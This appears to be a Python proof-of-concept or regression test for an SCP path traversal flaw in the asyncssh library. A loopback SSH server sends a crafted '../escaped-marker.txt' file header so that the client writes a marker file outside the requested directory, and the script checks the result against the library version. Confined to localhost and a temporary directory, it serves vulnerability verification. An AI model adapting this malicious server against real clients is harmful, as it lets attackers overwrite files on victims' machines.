import asyncio
import json
import tempfile
from pathlib import Path

import asyncssh


MARKER = "copilot-security-asyncssh-bounded-marker\n"


class LoopbackServer(asyncssh.SSHServer):
    def begin_auth(self, username):
        return False


async def malicious_scp_source(process):
    command = process.command or ""
    if "scp -f" not in command:
        process.exit(1)
        return
    try:
        await process.stdin.read(1)
        process.stdout.write(f"C0644 {len(MARKER.encode())} ../escaped-marker.txt\n")
        await process.stdin.read(1)
        process.stdout.write(MARKER)
        process.stdout.write("\0")
        await process.stdin.read(1)
    except (BrokenPipeError, asyncssh.Error):
        pass
    finally:
        process.exit(0)


async def run():
    with tempfile.TemporaryDirectory(prefix="copilot-security-asyncssh-") as root:
        root_path = Path(root)
        requested = root_path / "requested"
        escaped = root_path / "escaped-marker.txt"
        requested.mkdir()
        host_key = asyncssh.generate_private_key("ssh-ed25519")
        server = await asyncssh.create_server(
            LoopbackServer,
            "127.0.0.1",
            0,
            server_host_keys=[host_key],
            process_factory=malicious_scp_source,
        )
        error = None
        try:
            async with asyncssh.connect(
                "127.0.0.1",
                port=server.get_port(),
                username="fixture",
                known_hosts=None,
            ) as conn:
                await asyncssh.scp((conn, "release.tar"), requested)
        except (OSError, asyncssh.Error) as exc:
            error = f"{type(exc).__name__}: {exc}"
        finally:
            server.close()
            await server.wait_closed()

        escaped_contents = escaped.read_text() if escaped.exists() else None
        affected = tuple(int(part) for part in asyncssh.__version__.split(".")) <= (
            2,
            23,
            0,
        )
        if affected:
            assert escaped_contents == MARKER
            assert error is None
            outcome = "outside-target-write-observed"
        else:
            assert escaped_contents is None
            assert error is not None and "Invalid filename" in error
            outcome = "invalid-filename-rejected"

        return {
            "asyncssh": asyncssh.__version__,
            "bind": "127.0.0.1:random",
            "requested": "temporary-root/requested",
            "protocol": "scp -f; C ../escaped-marker.txt",
            "resolved": "temporary-root/escaped-marker.txt",
            "marker": escaped_contents,
            "error": error,
            "outcome": outcome,
            "cleanup": "TemporaryDirectory",
        }


print(json.dumps(asyncio.run(run()), sort_keys=True))
